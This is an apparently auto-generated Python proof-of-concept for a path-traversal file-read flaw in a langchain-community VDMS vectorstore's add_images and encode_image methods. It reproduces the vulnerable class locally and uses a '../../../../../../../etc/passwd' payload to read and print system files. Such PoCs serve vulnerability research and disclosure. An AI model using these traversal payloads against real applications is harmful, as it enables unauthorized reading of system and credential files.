#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-008
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_14.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only VDMS vectorstore.

Vulnerability: The `add_images` method passes user-controlled `uris` directly to
`encode_image`, which opens the file path without any sanitization. An attacker
can supply a path like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign
local file if /etc/passwd is not available) via the simulated API endpoint.
"""

import sys
import base64
import os
import tempfile
import uuid
from pathlib import Path

# ---------------------------------------------------------------------------
# Simulated vulnerable library code (exact reproduction of the vulnerable path)
# ---------------------------------------------------------------------------

class VDMS:
    """Minimal reproduction of the vulnerable VDMS class."""
    
    def __init__(self):
        self._embeddings = None  # not needed for PoC
    
    def encode_image(self, image_path: str) -> str:
        """Sink: opens file at image_path without validation."""
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """Entry: passes uris directly to encode_image."""
        # Map from uris to blobs to base64
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        
        if add_path and metadatas:
            for midx, uri in enumerate(uris):
                metadatas[midx]["image_path"] = uri
        elif add_path:
            metadatas = []
            for uri in uris:
                metadatas.append({"image_path": uri})
        
        # Populate IDs
        ids = ids if ids is not None else [str(uuid.uuid4()) for _ in uris]
        
        # For PoC we just return the base64 results (which contain the file contents)
        return b64_texts, ids


# ---------------------------------------------------------------------------
# Exploit demonstration
# ---------------------------------------------------------------------------

def main():
    # Configurable target file to read (safe default)
    # Use /etc/passwd on Linux, or a benign local file for testing
    if sys.platform.startswith("linux"):
        target_file = "/etc/passwd"
    else:
        # Create a benign test file for non-Linux systems
        test_dir = tempfile.mkdtemp()
        test_file = os.path.join(test_dir, "test_secret.txt")
        with open(test_file, "w") as f:
            f.write("This is a secret file content for PoC demonstration.\n")
        target_file = test_file
    
    # Path traversal payload: go up two directories from a typical image path
    # The actual path used in the library is arbitrary; we just need to reach
    # the target file via traversal.
    traversal_payload = f"../../../../../../..{target_file}"
    
    print(f"[*] Target file: {target_file}")
    print(f"[*] Using traversal payload: {traversal_payload}")
    
    # Instantiate the vulnerable class
    vdms = VDMS()
    
    try:
        # Trigger the vulnerability: call add_images with attacker-controlled path
        print("[*] Calling add_images with malicious path...")
        b64_results, ids = vdms.add_images(
            uris=[traversal_payload],
            metadatas=None,
            add_path=False
        )
        
        # Decode and display the result
        if b64_results:
            decoded = base64.b64decode(b64_results[0]).decode("utf-8", errors="replace")
            print(f"[+] SUCCESS: Read file contents ({len(decoded)} bytes):")
            print("-" * 60)
            print(decoded)
            print("-" * 60)
            
            # Verify we actually got the target file content
            with open(target_file, "r") as f:
                expected = f.read()
            if decoded.strip() == expected.strip():
                print("[✓] File content matches expected target file.")
            else:
                print("[!] File content differs from expected (may be truncated or different file).")
        else:
            print("[-] No results returned.")
            
    except FileNotFoundError as e:
        print(f"[-] File not found: {e}")
        print("[*] Try adjusting the traversal depth (e.g., add more '../' )")
    except PermissionError as e:
        print(f"[-] Permission denied: {e}")
        print("[*] The file exists but is not readable (unlikely for /etc/passwd)")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
    
    # Clean up temp file if created
    if 'test_file' in locals() and os.path.exists(test_file):
        os.remove(test_file)
        os.rmdir(test_dir)


if __name__ == "__main__":
    main()
